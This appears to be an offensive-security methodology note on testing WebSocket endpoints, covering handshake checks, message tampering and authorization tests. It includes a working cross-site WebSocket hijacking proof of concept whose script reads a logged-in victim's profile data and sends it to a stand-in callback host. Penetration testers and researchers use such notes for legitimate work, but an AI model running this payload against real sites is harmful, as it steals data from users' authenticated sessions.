# WebSockets

WS bypasses most HTTP middleware: no per-message auth, no CSRF token, no WAF body
inspection.

---

## Handshake

```
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13
Cookie: session=...
Origin: https://evil.com
```

- Is the `Origin` checked? If not → cross-site WebSocket hijacking (CSWSH).
- Is the session checked per message, or only at handshake?
- Is the handshake authenticated at all?

---

## CSWSH PoC

```html
<script>
const ws = new WebSocket('wss://t/ws');
ws.onopen = () => ws.send('{"action":"getProfile"}');
ws.onmessage = e => fetch('https://collab/?d=' + btoa(e.data));
</script>
```

Host it, open it while logged in, watch the callback.

---

## Message-level testing

- Replay a message from another user's session.
- Change `userId`, `roomId`, `orgId` in the message.
- Send malformed JSON, huge frames, binary frames.
- Send a message before the auth message completes.
- Send the auth message twice with different identities.

---

## Where it pays

Chat, notifications, collaborative editors, trading feeds, presence, live dashboards.

---

## Go deeper

1. Test whether the socket accepts a message with no prior auth frame.
2. Test whether authorization is per-subscription (subscribe to another room).
3. Test the socket on the mobile app — often unauthenticated.
4. Test for message injection into other users' channels.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
